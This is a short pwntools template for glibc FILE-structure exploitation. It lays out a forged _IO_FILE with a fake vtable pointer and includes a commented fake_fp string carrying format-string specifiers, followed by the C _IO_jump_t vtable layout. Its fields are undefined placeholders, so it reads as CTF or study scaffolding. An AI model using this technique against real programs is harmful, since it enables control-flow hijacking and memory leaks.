```python
from pwn import *

context.arch = 'amd64'


mix = '''
    unsigned short _cur_column;
    signed char _vtable_offset;
    char _shortbuf[1];
'''

IO = flat(
    _flags          ,   _IO_read_ptr      , # 0x10
    _IO_read_end    ,   _IO_read_base     , # 0x20
    _IO_write_base  ,   _IO_write_ptr     , # 0x30
    _IO_write_end   ,   _IO_buf_base      , # 0x40
    _IO_buf_end     ,   _IO_save_base     , # 0x50
    _IO_backup_base ,   _IO_save_end      , # 0x60
    _markers        ,   _chain            , # 0x70
    _fileno         ,   _flags2           , # 0x80
    mix             ,   _lock             , # 0x90
    _offset         ,   _codecvt          , # 0xa0
    _wide_data      ,   _freeres_list     , # 0xb0
    _freeres_buf    ,   __pad5            , # 0xc0
    mode + p32(0)   ,   0                 , # 0xd0
    0               ,   vtable            ,
)


'''
fake_fp = "%13$s%9$s".ljust(0x20,"\x00") + p64(write_base) + p64(write_ptr) + p64(write_end) + p64(0)*10+ p64(lock) + p64(0)*6 + p32(mode) + p32(0) + p64(0)*2 + p64(vtable)
'''
```
```c
struct _IO_jump_t
{
    JUMP_FIELD(size_t, __dummy);
    JUMP_FIELD(size_t, __dummy2);
    JUMP_FIELD(_IO_finish_t, __finish);
    JUMP_FIELD(_IO_overflow_t, __overflow);
    JUMP_FIELD(_IO_underflow_t, __underflow);
    JUMP_FIELD(_IO_underflow_t, __uflow);
    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
    /* showmany */
    JUMP_FIELD(_IO_xsputn_t, __xsputn);
    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);
    JUMP_FIELD(_IO_seekoff_t, __seekoff);
    JUMP_FIELD(_IO_seekpos_t, __seekpos);
    JUMP_FIELD(_IO_setbuf_t, __setbuf);
    JUMP_FIELD(_IO_sync_t, __sync);
    JUMP_FIELD(_IO_doallocate_t, __doallocate);
    JUMP_FIELD(_IO_read_t, __read);
    JUMP_FIELD(_IO_write_t, __write);
    JUMP_FIELD(_IO_seek_t, __seek);
    JUMP_FIELD(_IO_close_t, __close);
    JUMP_FIELD(_IO_stat_t, __stat);
    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);
    JUMP_FIELD(_IO_imbue_t, __imbue);
};
```